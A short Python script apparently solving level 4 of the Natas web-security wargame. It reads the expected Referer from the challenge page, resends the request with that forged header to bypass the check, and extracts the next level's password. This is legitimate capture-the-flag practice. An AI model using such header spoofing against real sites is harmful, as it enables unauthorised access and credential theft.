import requests
from requests.auth import HTTPBasicAuth
import natas
import re

def findReferer(HTMLResponse):
	"""
		Find the Referer in challenge page source code
		return :
			- string : URL of the expected Referer
	"""
	h = re.search('only from "(.*)"', HTMLResponse.text)
	if h :
		return(h.group(1))

challNumber = 4
user, password, url = natas.initLevel(challNumber)
print("[+] Request to "+url)


res = requests.get(url, auth=HTTPBasicAuth(user, password))

acceptedReferer = findReferer(res)

headers = {'Referer' : acceptedReferer} 

# request to the URL with BasicAuth
res = requests.get(url, auth=HTTPBasicAuth(user, password),headers=headers)

b, p = natas.findPasswordInString(res.text)
if b:
	print("[+] Password found ! ["+str(p)+"] ")
	natas.updateLevel(challNumber + 1, p)
	print("[+] Level "+str(challNumber + 1)+" updated")
